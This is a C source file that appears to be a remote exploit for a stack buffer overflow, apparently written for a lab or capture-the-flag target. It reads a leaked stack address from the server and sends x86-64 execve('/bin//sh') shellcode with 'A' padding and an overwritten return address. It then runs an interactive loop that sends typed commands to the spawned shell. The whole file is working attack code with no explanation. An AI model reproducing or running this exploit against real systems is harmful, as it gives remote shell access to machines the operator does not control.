#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h> 
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <inttypes.h> 
#define SIZE_B 1024
#define PADDING_STACK_TARGET 512
#define CMD_BUFFER 4098
#define RECV_BUFFER 4098
char shellcode[] = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"; 





static const char *hextable="0123456789abcdef" ; 


uint8_t get_byte_value(char buf[2]){
	
	uint8_t high = 0 ; 
	uint8_t low = 0 ; 


	int i = 0 ; 
	for(i ; i < 16 ; i++){
		if(buf[0] == hextable[i]) 
			high = i ; 
		if(buf[1] == hextable[i]) 
			low = i ;  
	}

	return (high << 4) | low  ;

}

uint64_t get_little_endian(const char *buf){
	uint64_t return_value = 0 ; 
	int i = 15 ; 
	for(i ; i > 0 ; i-=2){
		char byte[2] = {buf[i-1] , buf[i]} ; 
		uint8_t byte_value = get_byte_value(byte) ; 
		return_value = (return_value << 8) | byte_value ; 
		

	}
	return return_value ; 

}

int main(int argv , char** argc){

	int sock = 0 , read_val = 0 ; 
	struct sockaddr_in serv_addr ; 
	if(argv != 3 && argv != 4 ) {
		fprintf(stderr , "Usage : ./exploit <Server IPV4 address> <Server Port address> <Optionnal : RIP instruction address> \n"); 
		exit(EXIT_FAILURE) ; 
	}
	const char *ipv4 = argc[1] ; 
	const char *port = argc[2] ; 
	char buffer[SIZE_B] = {0}; 	
	if((sock = socket(AF_INET , SOCK_STREAM , 0)) < 0){
		fprintf(stderr , "Socket create error\n"); 
		exit(EXIT_FAILURE); 

	}
	serv_addr.sin_family = AF_INET ; 
	serv_addr.sin_port = htons(atoi(port)) ; 
	if(inet_pton(AF_INET , ipv4 , &serv_addr.sin_addr) <= 0){
		fprintf(stderr , "Invalid address \n");
		exit(EXIT_FAILURE); 
	}
	if(connect(sock , (struct sockaddr *) &serv_addr , sizeof(serv_addr)) < 0){
		fprintf(stderr , "Connection failed\n"); 
		exit(EXIT_FAILURE); 

	}
	read_val = read(sock , buffer , SIZE_B); 
	char* hexa  ;  
	if(argv == 4)
		hexa = argc[3] ; 
	else
		hexa = strstr(buffer , "0x") ;
	char* interrupt = strstr(hexa , "\n");
	if(interrupt != 0 ) *interrupt=0 ; 
	//printf("%s\n" , buffer); 
	char buf_hexa[16] ;
	int i = 0 ; 
	for(i ; i < 16 ; i++)
		buf_hexa[i] = '0' ; 
	hexa += 2 ;
	int padding = 16 - strlen(hexa) ;
	strcpy(buf_hexa + padding , hexa) ;
	uint64_t vuln_var_location_little_endian =  get_little_endian(buf_hexa); 
	int shellcode_size = strlen(shellcode) ; 	
	char buffer_exploit[PADDING_STACK_TARGET] = {0}  ; 
	strcpy(buffer_exploit,shellcode) ; 
	i = shellcode_size ; 
	for (i ; i < 72 ; i++)
		buffer_exploit[i] = 'A' ; 
	uint64_t  RIP =  vuln_var_location_little_endian ; 
	int j = 0 ; 
	uint64_t mask = 0xFF00000000000000 ; 
	for (j ; j < 8 ; j++){
		buffer_exploit[i] = (char) ((RIP & mask) >> (7 - j) * 8)  ;
		mask = mask >> 8 ;
		i++; 
	}


	send(sock , buffer_exploit , PADDING_STACK_TARGET , 0) ; 
	char command[CMD_BUFFER] = {0} ; 
	char recv_buffer[RECV_BUFFER] = {0} ;

	while(1) {
		memset(command , 0 , sizeof(command)); 
		memset(recv_buffer , 0 , sizeof(recv_buffer)); 
		fgets(command , CMD_BUFFER , stdin); 
		if( send(sock , command , CMD_BUFFER , 0) < 0) {
			fprintf(stderr , "Error sending command : %d\n" , errno); 
			exit(EXIT_FAILURE); 

		}
		if( recv(sock , recv_buffer , RECV_BUFFER , 0) < 0){
			fprintf(stderr , "Error receiving response : %d\n",errno); 
			exit(EXIT_FAILURE); 

		}
		printf("%s\n" , recv_buffer); 
	}
	close(sock) ; 
	return EXIT_SUCCESS ; 
}


